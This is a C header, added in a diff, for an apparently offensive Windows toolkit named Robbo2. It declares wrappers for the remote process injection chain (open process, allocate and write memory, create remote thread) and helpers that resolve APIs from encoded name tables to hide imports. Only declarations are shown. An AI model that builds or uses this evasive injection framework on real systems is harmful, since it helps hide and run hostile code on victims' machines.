@@ -1,0 +1,106 @@
+#!name##Robbo2Base_H
+#!itemType##sfile
+#!info##Robbo2 Base header file.
+#!lang##c
+
+
+
+
+#ifndef ROBBO_BASE_H
+#define ROBBO_BASE_H
+
+
+
+#define WIN32_LEAN_AND_MEAN
+#include <windows.h>
+#include <ntdef.h>
+#include <stdio.h>
+
+// ------------------------------------------------- MACROS -------------------------------------------------------------
+
+#define ROBBO_INITIALIZE_OBJECT_ATTRIBUTES(p, n, a, r, s) \
+{ \
+	(p)->Length = sizeof(OBJECT_ATTRIBUTES); \
+	(p)->RootDirectory = r; \
+	(p)->Attributes = a; \
+	(p)->ObjectName = n; \
+	(p)->SecurityDescriptor = s; \
+	(p)->SecurityQualityOfService = NULL; \
+}
+
+
+
+// ------------------------------------------------- STRUCT -------------------------------------------------
+typedef struct _CLIENT_ID
+{
+	PVOID UniqueProcess;
+	PVOID UniqueThread;
+} CLIENT_ID, *PCLIENT_ID;
+
+typedef struct _IO_STATUS_BLOCK {
+  union {
+    NTSTATUS Status;
+    PVOID    Pointer;
+  };
+  ULONG_PTR Information;
+} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;
+
+// --------------------------------------------- TYPES --------------------------------------------------
+
+typedef HMODULE (*RtypeLoadLibraryA)(LPCSTR);
+typedef INT (*RtypeMultiByteToWideChar)(UINT, DWORD, const char*, int, LPWSTR, int);
+typedef NTSTATUS (*RtypeLdrLoadDll)(PWSTR, PULONG, PUNICODE_STRING, HMODULE*);
+typedef void (*RtypeRtlInitUnicodeString)(PUNICODE_STRING, PCWSTR);
+typedef NTSTATUS (*RtypeNtOpenProcess)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID);
+typedef NTSTATUS (*RtypeNtAllocateVirtualMemory)(HANDLE, PVOID, ULONG_PTR, PSIZE_T, ULONG, ULONG);
+typedef NTSTATUS (*RtypeNtWriteVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
+typedef NTSTATUS (*RtypeNtCreateThreadEx)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
+typedef void (*RtypeSleep)(DWORD);
+typedef NTSTATUS (*RtypeNtCreateFile)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG);
+typedef NTSTATUS (*RtypeNtWriteFile)(HANDLE, HANDLE, PVOID, PVOID, PIO_STATUS_BLOCK, PVOID, ULONG, PLARGE_INTEGER, PULONG);
+typedef NTSTATUS (*RtypeNtClose)(HANDLE);
+
+extern void *robbo_addr_kernel32;
+extern void *robbo_addr_ntdll;
+
+
+// ------------------------------------------ FUNCTIONS -----------------------------------------------
+
+void robbo_initialize(void);
+void robbo_init_test(void);
+
+char* robbo_decode(int encode_table[]);
+void robbo_decode2(int encode_table[], char buff[], int buff_size);
+INT robbo_convert_utf16(const char* src_str, LPWSTR buffer, int buff_size);
+void* robbo_get_function_raw(char *func_name, void *dll_address);
+void* robbo_get_function(int encoded_table[], void *dll_address);
+HMODULE robbo_wapi_LoadLibraryA(LPCSTR dll_name);
+HMODULE robbo_rapi_LoadLibraryA(int encoded_name[]);
+HMODULE robbo_load_dll_raw_ldr_ldll(char dll_name[]);
+HMODULE robbo_load_dll_ldr(int encoded_name[]);
+void robbo_wapi_RtlInitUnicodeString(PUNICODE_STRING dest_str, PCWSTR source_str);
+NTSTATUS robbo_wapi_NtOpenProcess(PHANDLE proc_handle, ACCESS_MASK access_mask, POBJECT_ATTRIBUTES objAttr, PCLIENT_ID client_id);
+NTSTATUS robbo_wapi_NtAllocateVirtualMemory(HANDLE proc_handle, PVOID mem_addr, ULONG_PTR zero_bits, PSIZE_T mem_size, ULONG allocation_type, ULONG protect_flag);
+NTSTATUS robbo_wapi_NtWriteVirtualMemory(HANDLE proc_handle, PVOID mem_addr, PVOID buffer, SIZE_T bytes_num, PSIZE_T bytes_written);
+NTSTATUS robbo_wapi_NtCreateThreadEx(PHANDLE th_handle, ACCESS_MASK accMask, POBJECT_ATTRIBUTES objAttr, HANDLE proc_handle, PVOID start_func, PVOID func_args, ULONG create_flag, SIZE_T zero_bits, SIZE_T stack_size, SIZE_T max_stack_size, PVOID attr_list);
+void robbo_wapi_Sleep(DWORD milisec);
+NTSTATUS robbo_wapi_NtCreateFile(PHANDLE file_handle, ACCESS_MASK acc_mask, POBJECT_ATTRIBUTES obj_attr, PIO_STATUS_BLOCK io_status_block, PLARGE_INTEGER alloc_size, ULONG file_attr, ULONG share_access, ULONG create_dispotion, ULONG create_options, PVOID ea_buffer, ULONG ea_length);
+NTSTATUS robbo_wapi_NtWriteFile(HANDLE file_handle, HANDLE event_obj, PVOID apc_routine, PVOID apc_context, PIO_STATUS_BLOCK io_status, PVOID buffer, ULONG length, PLARGE_INTEGER byte_offset, PULONG key);
+NTSTATUS robbo_wapi_NtClose(HANDLE handler);
+
+// ------------------------------ FUNCTIONS ADDRESS -------------------------
+RtypeLoadLibraryA robbo_faddr_LoadLibraryA(void);
+RtypeLdrLoadDll robbo_faddr_LdrLoadDll(void);
+RtypeNtOpenProcess robbo_faddr_NtOpenProcess(void);
+RtypeNtAllocateVirtualMemory robbo_faddr_NtAllocateVirtualMemory(void);
+RtypeNtWriteVirtualMemory robbo_faddr_NtWriteVirtualMemory(void);
+RtypeNtCreateThreadEx robbo_faddr_NtCreateThreadEx(void);
+RtypeSleep robbo_faddr_Sleep(void);
+RtypeNtCreateFile robbo_faddr_NtCreateFile(void);
+RtypeNtWriteFile robbo_faddr_NtWriteFile(void);
+
+extern RtypeMultiByteToWideChar robbo_faddr_MultiByteToWideChar;
+extern RtypeRtlInitUnicodeString robbo_faddr_RtlInitUnicodeString;
+extern RtypeNtClose robbo_faddr_NtCloseL;
+
+#endif
